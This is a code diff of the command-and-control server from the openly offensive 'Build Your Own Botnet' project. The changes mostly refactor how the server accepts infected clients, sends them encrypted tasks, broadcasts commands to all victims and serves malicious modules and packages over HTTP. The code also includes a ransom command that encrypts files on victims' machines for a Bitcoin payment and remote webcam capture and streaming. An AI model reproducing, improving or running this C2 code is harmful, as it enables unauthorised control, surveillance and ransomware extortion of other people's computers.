@@ -45,18 +45,15 @@ import mysql.connector
 try:
     from modules import security, util
 except ImportError:
-    try:
-        from . import security, util
-    except ImportError:
-        pass
+    from . import security, util
 
 
 
 # globals
 
-_debug   = True
+_debug  = True
 
-_abort   = False
+_abort  = False
 
 _threads = collections.OrderedDict()
 
@@ -134,28 +131,26 @@ class Database(mysql.connector.MySQLConnection):
     
     """
     Database (Build Your Own Botnet)
-    
     """
 
     def __init__(self, **kwargs):
 
         """
         connect to MySQL and setup the database
-            keyword arguments:
-                host        hostname/IP address of MySQL host machine
-                user        authorized account username
-                password    authorized account password
-                database    name of the MySQL database to use
+            host        hostname/IP address of MySQL host machine
+            user        authorized account username
+            password    authorized account password
+            database    name of the MySQL database to use
 
         """
         super(Database, self).__init__(**kwargs)
-        self.setup()
         self.config(**kwargs)
-        self.query = self.cursor(dictionary=True)
-        self.tasks = collections.OrderedDict()
-        self.color = util.color()
+        self.tasks  = {}
+        self.setup  = self._setup()
+        self.query  = self.cursor(dictionary=True)
+        self._color = util.color()
 
-    def setup(self):
+    def _setup(self):
         try:
             with open('resources/setup.sql', 'r') as fd:
                 sql = fd.read().replace('{user}', self.user).replace('{host}', self.server_host)
@@ -178,30 +173,30 @@ class Database(mysql.connector.MySQLConnection):
                         j = json.loads(v.encode())
                         self._display(j, indent+2)
                     except:
-                        print(colorama.Style.BRIGHT + self.color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
+                        print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
                 elif isinstance(v, list):
                     for i in v:
                         if isinstance(v, dict):
-                            print(colorama.Style.BRIGHT + self.color + str(k).ljust(4  * indent).center(5 * indent))
+                            print(colorama.Style.BRIGHT + self._color + str(k).ljust(4  * indent).center(5 * indent))
                             self._display(v, indent+2)
                         else:
-                            print(colorama.Style.BRIGHT + self.color + str(i).ljust(4  * indent).center(5 * indent))
+                            print(colorama.Style.BRIGHT + self._color + str(i).ljust(4  * indent).center(5 * indent))
                 elif isinstance(v, dict):
-                    print(colorama.Style.BRIGHT + self.color + str(k).ljust(4  * indent).center(5 * indent))
+                    print(colorama.Style.BRIGHT + self._color + str(k).ljust(4  * indent).center(5 * indent))
                     self._display(v, indent+1)
                 elif isinstance(v, int):
                     if v in (0,1):
-                        print(colorama.Style.BRIGHT + self.color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(bool(v)).encode())
+                        print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(bool(v)).encode())
                     else:
-                        print(colorama.Style.BRIGHT + self.color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
+                        print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
                 else:
-                    print(colorama.Style.BRIGHT + self.color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
+                    print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
         elif isinstance(data, list):
             for row in data:
                 if isinstance(row, dict):
                     self._display(row, indent+2)
                 else:
-                    print(colorama.Style.BRIGHT + self.color + str(row).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
+                    print(colorama.Style.BRIGHT + self._color + str(row).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
 
         else:
             if hasattr(data, '_asdict'):
@@ -214,53 +209,31 @@ class Database(mysql.connector.MySQLConnection):
                 self._display(data, indent+2)
 
             else:
-                print(colorama.Style.BRIGHT + self.color + str(data.encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + v.encode()))
+                print(colorama.Style.BRIGHT + self._color + str(data.encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + v.encode()))
 
 
     def _reconnect(self):
         try:
             self.reconnect()
-            self.query = self.cursor(dictionary=True)
-            return True
+            self.query = self.cursor(named_tuple=True)
+            return "{}@{} reconnected".format(self.database.user, self.database.server_host)
         except Exception as e:
             util.debug("{} error: {}".format(self._reconnect.func_name, str(e)))
-        return False
 
 
-    def client_online(self, client_id):
+    def update_client(self, client_id, online):
         """
-        Set client status as online
+        Update client status to online/offline
         """
         try:
             if isinstance(client_id, str):
-                self.execute_query("UPDATE tbl_clients SET online=1 WHERE uid='%s'" % str(client_id))
-                return True
+                self.execute_query("UPDATE tbl_clients SET online=%d, last_online=NOW() WHERE uid='%s'" % (int(online), str(client_id)))
             elif isinstance(client_id, int):
-                self.execute_query("UPDATE tbl_clients SET online=1 WHERE id=%d" % int(client_id))
-                return True
+                self.execute_query("UPDATE tbl_clients SET online=%d, last_online=NOW() WHERE id=%d" % (int(online), int(client_id)))
             else:
                 util.debug("{} error: invalid input type (expected {}, received {})".format(self.offline_client.func_name, list, type(client_id)))
         except Exception as e:
             util.debug("{} error: {}".format(self.offline_client.func_name, str(e)))
-        return False
-
-
-    def client_offline(self, client_id):
-        """
-        Set client status as offline
-        """
-        try:
-            if isinstance(client_id, str):
-                self.execute_query("UPDATE tbl_clients SET online=0, last_online=NOW() WHERE uid='%s'" % str(client_id))
-                return True
-            elif isinstance(client_id, int):
-                self.execute_query("UPDATE tbl_clients SET online=0, last_online=NOW() WHERE id=%d" % int(client_id))
-                return True
-            else:
-                util.debug("{} error: invalid input type (expected {}, received {})".format(self.offline_client.func_name, list, type(client_id)))
-        except Exception as e:
-            util.debug("{} error: {}".format(self.offline_client.func_name, str(e)))
-        return False
 
 
     def client_remove(self, client_id):
@@ -447,13 +420,13 @@ class Server(threading.Thread):
     
     """
 
-    def __init__(self, host='localhost', port=1337, config=None):
+    def __init__(self, host, port, config=None):
         """
         create a new Server instance
-            keyword arguments:
-                host        host IP address of server
-                port        port number for server to listen on
-                config      file path of API key configuration file
+            host        host IP address of server
+            port        port number for server to listen on
+            config      file path of API key configuration file
+
             
         """
         super(Server, self).__init__()
@@ -482,15 +455,15 @@ class Server(threading.Thread):
             'back'          :   self.client_background,
             'bg'            :   self.client_background,
             'sendall'	    :   self.task_broadcast,
-            'broadcast'     :   self.task_broadcast,
+            'braodcast'     :   self.task_broadcast,
             'results'       :   self.task_list,
             'tasks'         :   self.task_list
             }
+        self.clients        = {}
         self.current_client = None
         self.host           = host
         self.port           = port
         self.name           = time.time()
-        self.clients        = collections.OrderedDict()
         self.config         = self._config(config)
         self.database       = self._database()
         
@@ -511,14 +484,14 @@ class Server(threading.Thread):
         util.debug(str(data))
         if self.current_client:
             with self.current_client._lock:
-                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Error: ' + data + '\n')
+                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')
         else:
             with self._lock:
-                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Error: ' + data + '\n')
+                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')
 
 
     def _kill(self):
-        for _ in globals()['_threads']:
+        for _ in _threads:
             if isinstance(_, subprocess.Popen):
                 _.terminate()
                 del _
@@ -565,17 +538,16 @@ class Server(threading.Thread):
 
 
     def _database(self):
-        db = None
-        os.chdir(globals()['_rootdir'])
+        os.chdir(_rootdir)
         with self._lock:
-            print(util.color() + colorama.Style.BRIGHT + "\n\n" + str(open('resources/banner.txt').read() if os.path.isfile('resources/banner.txt') else ''))
-            print(colorama.Fore.RESET + colorama.Style.DIM + '{:>40}\n{:>25}\n'.format('Build Your Own Botnet','v0.1.2'))
+            print(util.color() + colorama.Style.BRIGHT + "\n\n" + str(open('resources/banner.txt').read() if os.path.isfile('resources/banner.txt') else '') + colorama.Fore.WHITE + colorama.Style.DIM + '\n{:>40}\n{:>25}\n'.format('Build Your Own Botnet','v0.1.2'))
             print(colorama.Fore.YELLOW + colorama.Style.BRIGHT + "[?] " + colorama.Fore.RESET + colorama.Style.DIM + "Hint: show usage information with the 'help' command\n")
+        db = None
         if self.config.has_section('database'):
             try:
                 db = Database(**dict(self.config['database']))
                 with self._lock:
-                    print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Connected to database: " + colorama.Style.BRIGHT + self.config['database'].get('database'))
+                    print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Connected to database")
             except:
                 db = Database()
                 max_v = max(map(len, self.config['database'].values())) + 2
@@ -590,6 +562,10 @@ class Server(threading.Thread):
                 with self._lock:
                     print(colorama.Fore.RED + colorama.Style.BRIGHT + "[-] " + colorama.Fore.RESET + colorama.Style.DIM + "Error: unable to connect to the currently configured MySQL database\n\thost:  %s\n\tuser: %s" % ('\x20' * 4 + ' ' * 4 + self.config['database'].get('host').rjust(max_v), '\x20' * 4 + ' ' * 4 + self.config['database'].get('user').rjust(max_v).rjust(max_v)))
         return db
+
+
+    def _get_clients(self):
+        return [v for v in self.clients.values()]
 
 
     def _get_client_by_id(self, client_id):
@@ -614,59 +590,7 @@ class Server(threading.Thread):
         else:
             self._error("Invalid input type (expected '{}', received '{}')".format(socket.socket, type(connection)))
         return client
-
-
-    @util.threaded
-    def handle_clients(self, sock=None):
-        if not sock:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            sock.bind((self.host, self.port))
-            sock.listen(10)
-        while True:
-            conn, addr = sock.accept()
-            client  = Client(conn, name=self._count)
-            self.clients[self._count] = client
-            self._count  += 1
-            client.start()                        
-            if not self.current_client:
-                with self._lock:
-                    print(self._prompt_color + self._prompt_style + str("[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd()), end="")
-            else:
-                if self.current_client._prompt:
-                    self.display(str(self.current_client._prompt) % int(self.current_client.name), end="")
-
-            
-    @util.threaded
-    def handle_tasks(self, port=None):
-        try:
-            if not port:
-                port    = self.port + 1
-            task_server = TaskServer(port=port)
-            task_server.serve_until_stopped()
-        except Exception as e:
-            self._error(str(e))
-            
-
-    def handle_packages(self, port=None):
-        try:
-            if not port:
-                port    = self.port + 2
-            dirname = os.path.join(globals()['_rootdir'], 'packages')
-            return subprocess.Popen([sys.executable, '-m', 'SimpleHTTPServer', str(port)], 0, None, None, subprocess.PIPE, subprocess.PIPE, cwd=dirname, shell=True)
-        except Exception as e:
-            self._error(str(e))
-
-
-    def handle_modules(self, port=None):
-        try:
-            if not port:
-                port    = self.port + 3
-            dirname = os.path.join(globals()['_rootdir'], 'modules')
-            return subprocess.Popen([sys.executable, '-m', 'SimpleHTTPServer', str(port)], 0, None, None, subprocess.PIPE, subprocess.PIPE, cwd=dirname, shell=True)
-        except Exception as e:
-            self._error(str(e))
-            
+        
 
     def debug(self, code):
         """
@@ -676,9 +600,9 @@ class Server(threading.Thread):
             try:
                 return eval(code)
             except Exception as e:
-                self._error(str(e))
+                self._error("Error: %s" % str(e))
         else:
-            self._error("debugging mode is disabled")
+            self._error("Debugging mode is disabled")
 
 
     def quit(self):
@@ -686,7 +610,7 @@ class Server(threading.Thread):
         Quit server and optionally keep clients alive
         """
         if self._server_prompt('Quiting server - keep clients alive? (y/n): ').startswith('y'):
-            for client in self.clients.values():
+            for client in self._get_clients():
                 client._active.set()
                 self.task_send('passive', client_id=client.name)
         globals()['_abort'] = True
@@ -730,7 +654,7 @@ class Server(threading.Thread):
                 except:
                     print(self._text_color + self._text_style + str(info))
             else:
-                self._error("invalid data type - input should be in JSON format")
+                self._error("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))
 
 
     def query(self, stmt):
@@ -738,7 +662,7 @@ class Server(threading.Thread):
         Query the database
         """
         try:
-            _= self.database.execute_query(stmt, display=True)
+            _ = self.database.execute_query(stmt, display=True)
         except Exception as e:
             self._error(str(e))
     
@@ -803,6 +727,93 @@ class Server(threading.Thread):
                 print('\nDisplay Settings\n\n  usage:  settings <type> <option> <color|style>\n  \n    type   - text, prompt\n    option - color, style\n    color  - black, white, blue, red, green, magenta, yellow\n    style  - dim, normal, bright\n\nDebugging Mode\n\t\n  usage: settings debug <on|off>\n')
 
 
+    @util.threaded
+    def handle_clients(self, sock=None):
+        """
+        Handle incoming client connections
+        """
+        if not sock:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.bind((self.host, self.port))
+            sock.listen(10)
+        while True:
+            try:
+                conn, addr = sock.accept()
+                client  = Client(conn, name=self._count)
+                self.clients[self._count] = client
+                self._count  += 1
+                client.start()                        
+                if not self.current_client:
+                    with self._lock:
+                        print(self._prompt_color + self._prompt_style + str("[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd()), end="")
+                else:
+                    if self.current_client._prompt:
+                        self.display(str(self.current_client._prompt) % int(self.current_client.name), end="")
+            except Exception as e:
+                util.debug("Client handler restarting...")
+                time.sleep(3)
+                return self.handle_clients(sock=sock)
+                                           
+            
+    @util.threaded
+    def handle_tasks(self, port=None):
+        """
+        Handle incoming task results
+        """
+        try:
+            if not port:
+                port    = self.port + 1
+            task_server = TaskServer(port=port)
+            task_server.serve_until_stopped()
+        except Exception as e:
+            self._error(str(e))
+            
+
+    def handle_packages(self, port=None):
+        """
+        Handle incoming requests for Python packages
+        """
+        try:
+            if not port:
+                port = self.port + 2
+            dirname  = os.path.join(_rootdir, 'packages')
+            process  = subprocess.Popen([sys.executable, '-m', 'SimpleHTTPServer', str(port)], 0, None, None, subprocess.PIPE, subprocess.PIPE, cwd=dirname, shell=True)
+            while True:
+                if process.poll():
+                    time.sleep(1)
+                else:
+                    process.terminate()
+                    break
+            util.debug('Package handler restarting...')
+            time.sleep(3)
+            return handle_packages(port=port)
+        except Exception as e:
+            self._error(str(e))
+
+
+    def handle_modules(self, port=None):
+        """
+        Handle incoming requests for client modules
+        """
+        try:
+            if not port:
+                port = self.port + 3
+            dirname  = os.path.join(_rootdir, 'modules')
+            process  = subprocess.Popen([sys.executable, '-m', 'SimpleHTTPServer', str(port)], 0, None, None, subprocess.PIPE, subprocess.PIPE, cwd=dirname, shell=True)
+            while True:
+                if process.poll():
+                    time.sleep(1)
+                else:
+                    process.terminate()
+                    break
+            util.debug('Module handler restarting...')
+            time.sleep(3)
+            return handle_modules(port=port)
+        except Exception as e:
+            self._error(str(e))
+
+
     def task_send(self, command, client_id=None, connection=None):
         """
         Send command to a client as a standard task
@@ -817,7 +828,7 @@ class Server(threading.Thread):
             
         if client:
             try:
-                task    = {'client': client.info['uid'], 'command': command}
+                task    = {'client': client.info['id'], 'command': command}
                 task_id = self.database.handle_task(task)
                 data    = security.encrypt_aes(json.dumps(task), client.key)
                 sock.sendall(struct.pack(">L", len(data))+data)
@@ -854,7 +865,7 @@ class Server(threading.Thread):
                     except Exception as e1:
                         util.debug(str(e1))
             except Exception as e:
-                self._error(str(e))
+                self._error("{} error: {}".format(self.task_recv.func_name, str(e)))
                 time.sleep(1)
                 client._active.clear()
                 self.client_remove(client.name)
@@ -866,35 +877,35 @@ class Server(threading.Thread):
 
     def task_list(self, client_id=None):
         """
-        List tasks and results for a client or all clients
+        List client tasks and results
         """
-        uid = None
         if client_id:
-            return self.database.get_tasks(self._get_client_by_id(client_id).info.get('uid'))
-        elif self.current_client:
-            return self.database.get_tasks(self.current_client.info.get('uid'))
-        else:
-            return self.database.get_tasks()
+            client = self._get_client_by_id(client_id)
+            if client:
+                uid = client.uid
+                if uid:
+                    return self.database.get_tasks(uid)
+        return self.database.get_tasks()            
 
 
     def task_broadcast(self, msg):
         """
-        Broadcast a new task to send it to all clients
+        Broadcast a task to all clients
         """
-        for client in self.clients.values():
+        for client in self._get_clients():
             try:
                 self.task_send(msg, client_id=client.name)
             except Exception as e:
-                self._error(str(e))
+                self._error('{} returned error: {}'.format(self.task_broadcast.func_name, str(e)))
 
 
     def client_webcam(self, args=''):
         """
-        Interact with a client webcam - image | video | stream
+        Interact with client webcam - image | video | stream
         """
         try:
             if not self.current_client:
-                self._error("no client selected")
+                self._error( "No client selected")
                 return
             client = self.current_client
             result = ''
@@ -940,10 +951,9 @@ class Server(threading.Thread):
                     result = 'Webcam stream ended'
             else:
                 self.task_send("webcam %s" % args, client.name)
-                task    = self.task_recv(client_id=client.name)
+                task    = self.task_recv(client.connection)
                 result  = task.get('result')
-            if result:
-                self.display(result)
+            self.display(result)
         except Exception as e:
             util.debug("webcam stream failed with error: {}".format(str(e)))
 
@@ -953,42 +963,47 @@ class Server(threading.Thread):
         """
         Shutdown client shell and remove client from database
         """
-        try:
-            client = self._get_clients_by_id(client_id)
-            client._active.clear()
-            self.task_send('kill', client_id=client_id)
+        if not str(client_id).isdigit() or int(client_id) not in self.clients:
+            return
+        else:
             try:
-                client._socket.close()
-            except: pass
-            try:
-                client._socket.shutdown()
-            except: pass
-            _ = self.clients.pop(int(client_id), None)
-            if not self.current_client:
-                with self._lock:
-                    print(self._text_color + self._text_style + 'Client {} disconnected'.format(client_id))
-                self._active.set()
+                client = self.clients[int(client_id)]
                 client._active.clear()
-                return self.run()
-            elif int(client_id) == self.current_client.name:
-                with self.current_client._lock:
-                    print(self._text_color + self._text_style + 'Client {} disconnected'.format(client_id))
-                self._active.clear()
-                self.current_client._active.set()
-                return self.current_client.run()
-            else:
-                with self._lock:
-                    print(self._text_color + self._text_style + 'Client {} disconnected'.format(client_id))
-                self._active.clear()
-                self.current_client._active.set()
-                return self.current_client.run()
-        except Exception as e:
-            self._error('{} failed with error: {}'.format(self.client_remove.func_name, str(e)))
+                self.task_send('kill', client_id=client_id)
+                try:
+                    client._socket.close()
+                except: pass
+                try:
+                    client._socket.shutdown()
+                except: pass
+                _ = self.clients.pop(int(client_id), None)
+                del _
+                print(self._text_color + self._text_style)
+                if not self.current_client:
+                    with self._lock:
+                        print('Client {} disconnected'.format(client_id))
+                    self._active.set()
+                    client._active.clear()
+                    return self.run()
+                elif int(client_id) == self.current_client.name:
+                    with self.current_client._lock:
+                        print('Client {} disconnected'.format(client_id))
+                    self._active.clear()
+                    self.current_client._active.set()
+                    return self.current_client.run()
+                else:
+                    with self._lock:
+                        print('Client {} disconnected'.format(client_id))
+                    self._active.clear()
+                    self.current_client._active.set()
+                    return self.current_client.run()
+            except Exception as e:
+                self._error('{} failed with error: {}'.format(self.client_remove.func_name, str(e)))
 
 
     def client_list(self, args=None):
         """
-        List currently online clients and/or all clients
+        List currently online clients | -v/--verbose
         """
         args    = str(args).split()
         verbose = bool('-v' in args or '--verbose' in args)
@@ -1001,7 +1016,7 @@ class Server(threading.Thread):
 
     def client_ransom(self, args=None):
         """
-        Encrypt the files on a client host machine and decrypt the files if the user pays a ransom in Bitcoin
+        Encrypt and ransom files on client machine | -e/--encrypt, -d/--decrypt
         """
         if self.current_client:
             if 'decrypt' in str(args):
@@ -1009,7 +1024,7 @@ class Server(threading.Thread):
             elif 'encrypt' in str(args):
                 self.task_send("ransom %s" % args, client_id=self.current_client.name)
             else:
-                self._error("invalid option '%s'" % args)
+                self._error("Error: invalid option '%s'" % args)
         else:
             self._error("No client selected")
 
@@ -1044,11 +1059,11 @@ class Server(threading.Thread):
 
 
     def run(self):
+        _threads['task_handler']    = self.handle_tasks()
+        _threads['client_handler']  = self.handle_clients()
+        _threads['module_handler']  = self.handle_modules()
+        _threads['package_handler'] = self.handle_packages()
         self._active.set()
-        globals()['_threads']['task_handler']    = self.handle_tasks()
-        globals()['_threads']['client_handler']  = self.handle_clients()
-        globals()['_threads']['module_handler']  = self.handle_modules()
-        globals()['_threads']['package_handler'] = self.handle_packages()
         while True:
             try:
                 self._active.wait()
@@ -1083,8 +1098,7 @@ class Server(threading.Thread):
 class Client(threading.Thread):
 
     """
-    Client (Build Your Own Botnet)
-    
+    Client (Build Your Own Botnet)    
     """
 
     def __init__(self, sock, name=None):
@@ -1094,14 +1108,13 @@ class Client(threading.Thread):
             name    integer representing client for quickly selecting in console
         """
         super(Client, self).__init__()
+        self.name       = name
         self._prompt    = None
         self._socket    = sock
         self._active    = threading.Event()
         self._created   = time.time()
-        self.name       = name
         self.key        = security.diffiehellman(self._socket)
         self.info       = self._info()
-
 
     def _error(self, data):
         with globals()['_threads']['server']._lock:
@@ -1197,21 +1210,21 @@ class Client(threading.Thread):
                 self._error(str(e))
                 time.sleep(1)
                 break
-            
         globals()['_threads']['server']._return()
 
 
 
 def main():
-    parser = argparse.ArgumentParser(prog='server.py', description="Command & Control Server (Build Your Own Botnet)", version='0.1.2')
-    parser.add_argument('-p', '--port', action='store', type=int, default=1337, help='port number for incoming client connections')
-    parser.add_argument('-c', '--config',  action='store', type=str, default='../config.ini', help='configuration file path')
+    parser = argparse.ArgumentParser(prog='server.py', description="Command & Control Server (Build Your Own Botnet)", version='0.4.7')
+    parser.add_argument('host', type=str, default='localhost', action='store', help='IP address to host server on')
+    parser.add_argument('port', type=int, default=1337, action='store', help='port for the server to listen on')
+    parser.add_argument('--config', action='store', default='../config.ini', help='configuration file')
     parser.add_argument('--debug', action='store_true', default=False, help='enable debugging mode')
     try:
         options = parser.parse_args()
-        globals()['globals()['_debug']'] = options.debug
-        globals()['_threads']['server'] = Server(port=options.port, config=options.config)
-        globals()['_threads'].start()
+        globals()['_debug'] = options.debug
+        globals()['_threads']['server']  = Server(options.host, options.port, config=options.config)
+        globals()['_threads']['server'].start()
     except Exception as e:
         print("\n" + colorama.Fore.RED + colorama.Style.NORMAL + "[-] " + colorama.Fore.RESET + "Error: %s" % str(e) + "\n")
         parser.print_help()
